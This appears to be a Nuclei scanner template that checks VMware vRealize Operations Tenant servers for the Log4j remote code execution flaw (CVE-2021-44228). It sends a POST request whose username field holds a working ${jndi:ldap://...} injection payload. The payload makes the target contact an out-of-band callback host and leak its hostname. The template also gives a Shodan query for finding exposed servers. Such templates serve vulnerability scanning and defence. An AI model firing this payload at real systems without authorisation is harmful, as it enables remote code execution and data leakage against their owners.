http:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 2
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'POST /suite-api/api/auth/token/acquire HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    Origin: {{RootURL}}

    Referer: {{RootURL}}/ui/


    {"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}","password":"admin"}

    '
id: vrealize-operations-log4j-rce
info:
  author: bughuntersurya
  classification:
    cpe: cpe:2.3:a:vmware:vrealize_operations:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-44228
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: 'VMware vRealize Operations is susceptible to a critical vulnerability
    in Apache Log4j which may allow remote code execution in an impacted vRealize
    Operations Tenant application.

    '
  metadata:
    max-request: 1
    product: vrealize_operations
    shodan-query: http.title:"vRealize Operations Tenant App"
    vendor: vmware
    verified: true
  name: VMware vRealize Operations Tenant - JNDI Remote Code Execution (Apache Log4j)
  reference:
  - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
  - https://core.vmware.com/vmsa-2021-0028-questions-answers-faq
  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
  - https://nvd.nist.gov/vuln/detail/CVE-2021-45046
  - https://logging.apache.org/log4j/2.x/security.html
  severity: critical
  tags: cve,cve2021,oast,rce,log4j,vmware,vrealize,kev,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'
